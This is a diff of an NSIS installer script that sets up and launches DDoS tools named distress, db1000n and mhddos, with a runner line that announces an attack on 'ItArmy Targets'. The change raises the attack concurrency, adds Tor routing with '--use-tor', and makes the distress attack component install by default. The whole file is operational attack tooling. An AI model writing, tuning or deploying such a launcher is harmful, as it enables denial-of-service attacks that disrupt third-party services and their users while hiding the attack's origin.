@@ -100,9 +100,9 @@ Section ;RUNNER
   FileWrite $9 "CD ${DISTRESS_DIR}$\r$\n"
   FileWrite $9 "ECHO Start DISTRESS Attack ItArmy Targets$\r$\n"
   ${If} ${RunningX64}
-	FileWrite $9 "distress_x86_64-pc-windows-msvc.exe$\r$\n"
+	FileWrite $9 "distress_x86_64-pc-windows-msvc.exe -с 4096 --use-tor 6$\r$\n"
   ${Else}
-	FileWrite $9 "distress_i686-pc-windows-msvc.exe$\r$\n"
+	FileWrite $9 "distress_i686-pc-windows-msvc.exe -с 2048$\r$\n"
   ${EndIf}
   FileWrite $9 "goto END$\r$\n"
 
@@ -176,8 +176,8 @@ Section	"db1000n"
 
 SectionEnd
 
-Section /o "distress"
-	SectionIn RO
+Section "distress"
+	;SectionIn RO
 	SetOutPath ${DISTRESS_DIR}
 
   ;Add mhddos firewall rules
